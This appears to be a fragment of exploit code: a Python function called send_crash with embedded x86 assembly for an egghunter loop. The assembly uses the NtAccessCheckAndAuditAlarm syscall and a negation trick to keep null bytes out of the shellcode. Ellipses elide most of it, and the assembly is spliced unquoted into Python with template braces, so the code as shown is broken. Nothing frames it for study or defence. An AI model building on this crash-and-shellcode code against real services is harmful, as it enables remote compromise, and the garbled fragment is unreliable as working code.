...
def send_crash(server, port):
    ...
    loop_check:
        ...
        push {syscallNumber}; SysCall: NTAccessCheckAndAuditAlarm. 0x01c9 updated syscall number. 000001c9 has nullbytes, use NEG value here
        pop eax			    ; Restore the SysCall num into EAX
        {"neg eax			    ; 1 - eax." if needs_invert else ""} 
